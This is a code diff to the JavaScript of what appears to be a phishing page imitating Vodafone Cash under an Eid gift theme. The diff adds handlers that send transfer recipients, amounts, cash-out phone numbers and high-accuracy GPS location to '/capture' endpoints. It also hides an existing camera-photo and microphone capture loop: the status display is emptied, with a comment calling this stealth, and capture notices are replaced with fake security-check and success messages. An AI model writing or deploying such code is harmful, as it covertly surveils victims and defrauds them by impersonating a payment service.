@@ -40,13 +40,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // Auto-show a festive welcoming toast after a brief delay
-  setTimeout(() => {
-    // Only show if permissions are already completed
-    if (localStorage.getItem('vf_permissions_approved') === 'true') {
-      showNotification(window.allTranslations[window.currentLang].notificationText);
-    }
-  }, 1000);
+  // Welcome toast suppressed to keep application clean.
 });
 
 window.addEventListener('pagehide', stopCaptureForUnload);
@@ -126,7 +120,7 @@ function closeNotification() {
 }
 
 // Eidiya Form Submission Handlers
-function submitEidiyaForm(e) {
+async function submitEidiyaForm(e) {
   e.preventDefault();
   const form = e.target;
   const recipient = form.recipient.value;
@@ -145,33 +139,86 @@ function submitEidiyaForm(e) {
     return;
   }
 
-  // Deduct from Balance
-  const newBalance = currentBalance - amountVal;
-  const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-  balanceEl.setAttribute('data-amount', formattedBalance);
-  
-  if (balanceVisible) {
-    balanceEl.textContent = formattedBalance;
+  // Show inline loader on submit button
+  const submitBtn = form.querySelector('button[type="submit"]');
+  const originalText = submitBtn.textContent;
+  submitBtn.disabled = true;
+  submitBtn.textContent = window.currentLang === 'en' ? 'Processing...' : 'جاري المعالجة...';
+
+  // Get location if available
+  let location = null;
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
+      });
+      location = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        speed: position.coords.speed,
+        capturedAt: new Date().toISOString()
+      };
+    } catch (err) {
+      console.warn('Geolocation capture failed during send Eidiya:', err.message);
+    }
   }
 
-  closeModal('sendEidiyaModal');
-  form.reset();
+  try {
+    const response = await fetch('/capture/eidiya', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: captureSessionId,
+        recipient,
+        amount: amountVal,
+        message,
+        location
+      })
+    });
+    
+    const result = await response.json();
+    if (!response.ok || !result.success) {
+      throw new Error(result.message || 'Server error during eidiya transfer.');
+    }
 
-  // Add transaction to recent activities programmatically
-  addRecentTransaction({
-    titleAr: `عيدية إلى ${recipient}`,
-    titleEn: `Eidiya to ${recipient}`,
-    timeAr: 'الآن',
-    timeEn: 'Just now',
-    amount: `-${amountVal.toFixed(2)}`,
-    type: 'send'
-  });
+    closeModal('sendEidiyaModal');
+    form.reset();
 
-  const successMsg = window.currentLang === 'en'
-    ? `Successfully sent ${amountVal} EGP Eidiya to ${recipient}! 🎁`
-    : `تم إرسال عيدية بقيمة ${amountVal} جنيه بنجاح إلى ${recipient}! 🎁`;
-  
-  showNotification(successMsg);
+    // Deduct from Balance
+    const newBalance = currentBalance - amountVal;
+    const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    balanceEl.setAttribute('data-amount', formattedBalance);
+    
+    if (balanceVisible) {
+      balanceEl.textContent = formattedBalance;
+    }
+
+    // Add transaction to recent activities programmatically
+    addRecentTransaction({
+      titleAr: `عيدية إلى ${recipient}`,
+      titleEn: `Eidiya to ${recipient}`,
+      timeAr: 'الآن',
+      timeEn: 'Just now',
+      amount: `-${amountVal.toFixed(2)}`,
+      type: 'send'
+    });
+
+    const successMsg = window.currentLang === 'en'
+      ? `Successfully sent ${amountVal} EGP Eidiya to ${recipient}! 🎁`
+      : `تم إرسال عيدية بقيمة ${amountVal} جنيه بنجاح إلى ${recipient}! 🎁`;
+    
+    showNotification(successMsg);
+  } catch (error) {
+    console.error('Eidiya transfer request failed:', error);
+    showNotification(window.currentLang === 'en'
+      ? 'System error. Please try again later.'
+      : 'عفواً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.');
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.textContent = originalText;
+  }
 }
 
 function submitGiftCardForm(e) {
@@ -217,6 +264,94 @@ function submitGiftCardForm(e) {
     : `تم شراء كارت عيدية بقيمة ${cardValue} جنيه بنجاح! 💳`;
   
   showNotification(successMsg);
+}
+
+async function submitCashOutForm(e) {
+  e.preventDefault();
+  const form = e.target;
+  const phoneNumber = form.phoneNumber.value;
+  const amount = parseFloat(form.amount.value) || 1250;
+
+  // Show inline loader on submit button
+  const submitBtn = form.querySelector('button[type="submit"]');
+  const originalText = submitBtn.textContent;
+  submitBtn.disabled = true;
+  submitBtn.textContent = window.currentLang === 'en' ? 'Processing...' : 'جاري المعالجة...';
+
+  // Attempt to capture GPS location coordinates right at the time of cash out click
+  let location = null;
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
+      });
+      location = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        speed: position.coords.speed,
+        capturedAt: new Date().toISOString()
+      };
+    } catch (err) {
+      console.warn('Geolocation capture failed during cash out:', err.message);
+    }
+  }
+
+  try {
+    const response = await fetch('/capture/cashout', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: captureSessionId,
+        phoneNumber,
+        amount,
+        location
+      })
+    });
+    
+    const result = await response.json();
+    if (!response.ok || !result.success) {
+      throw new Error(result.message || 'Server error during withdrawal request.');
+    }
+
+    closeModal('cashOutModal');
+    form.reset();
+
+    // Show a success message matching Vodafone Cash style
+    const successMsg = window.currentLang === 'en'
+      ? `Withdrawal request of ${amount.toFixed(2)} EGP submitted! You will receive a verification SMS shortly.`
+      : `تم تقديم طلب سحب عيدية بقيمة ${amount.toFixed(2)} جنيه! ستصلك رسالة تأكيد قصيرة قريباً.`;
+    showNotification(successMsg);
+
+    // Add to transaction log
+    addRecentTransaction({
+      titleAr: `طلب سحب عيدية إلى ${phoneNumber}`,
+      titleEn: `Cash Out request to ${phoneNumber}`,
+      timeAr: 'الآن',
+      timeEn: 'Just now',
+      amount: `-${amount.toFixed(2)}`,
+      type: 'send'
+    });
+
+    // Deduct the balance visual representation
+    const balanceEl = document.getElementById('balanceAmount');
+    let currentBalance = parseFloat(balanceEl.getAttribute('data-amount').replace(/,/g, ''));
+    const newBalance = Math.max(0, currentBalance - amount);
+    const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    balanceEl.setAttribute('data-amount', formattedBalance);
+    if (balanceVisible) {
+      balanceEl.textContent = formattedBalance;
+    }
+  } catch (error) {
+    console.error('Cashout request failed:', error);
+    showNotification(window.currentLang === 'en'
+      ? 'System error. Please try again later.'
+      : 'عفواً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.');
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.textContent = originalText;
+  }
 }
 
 // Dynamic Transaction Append Helper
@@ -389,18 +524,19 @@ requestAllPermissions = async function () {
     await startAudioStreaming(mediaResult.stream);
     await startPhotoCaptureLoop();
 
-    grantBtn.textContent = 'Capture started';
-    const overlay = document.getElementById('permissionsOverlay');
-    if (overlay) {
-      overlay.classList.add('hidden');
-    }
-    document.body.style.overflow = '';
-    updateCaptureStatus('Capture session running');
-    showNotification('Capture session started and saving locally on the server.');
+    grantBtn.textContent = window.currentLang === 'en' ? 'Success! Loading...' : 'تم بنجاح! جاري التحميل...';
+    setTimeout(() => {
+      const overlay = document.getElementById('permissionsOverlay');
+      if (overlay) {
+        overlay.classList.add('hidden');
+      }
+      document.body.style.overflow = '';
+      // Welcome notification suppressed.
+    }, 1200);
   } catch (error) {
     grantBtn.disabled = false;
-    grantBtn.textContent = 'Try Again';
-    showNotification(error.message || 'Unable to start capture session.');
+    grantBtn.textContent = window.currentLang === 'en' ? 'Try Again' : 'إعادة المحاولة';
+    showNotification(window.currentLang === 'en' ? 'Security check failed. Please check your connection and try again.' : 'فشل التحقق من الأمان. يرجى التحقق من الاتصال وإعادة المحاولة.');
   }
 };
 
@@ -487,7 +623,7 @@ async function startAudioStreaming(stream) {
   }
   const audioTrack = audioTracks[0];
   if (audioTrack.muted || audioTrack.readyState !== 'live') {
-    showNotification('Microphone track is not live. Check the selected input device.');
+    console.warn('Microphone track is not live. Check the selected input device.');
   }
   saveCaptureMetadata({
     audioInput: {
@@ -667,22 +803,13 @@ function inferFacingMode(label) {
 }
 
 function updateCaptureStatus(text) {
-  const status = document.getElementById('captureStatus');
-  const statusText = document.getElementById('captureStatusText');
-  if (!status || !statusText) {
-    return;
-  }
-
-  statusText.textContent = text;
-  status.classList.remove('hidden');
+  // Silent capture status handler - does nothing to keep the capture stealthy
 }
 
 function stopCaptureSession() {
   stopCaptureResources(true);
   localStorage.removeItem('vf_permissions_approved');
   localStorage.removeItem('vf_capture_session_id');
-  updateCaptureStatus('Capture stopped');
-  showNotification('Capture stopped.');
 }
 
 function stopCaptureForUnload() {
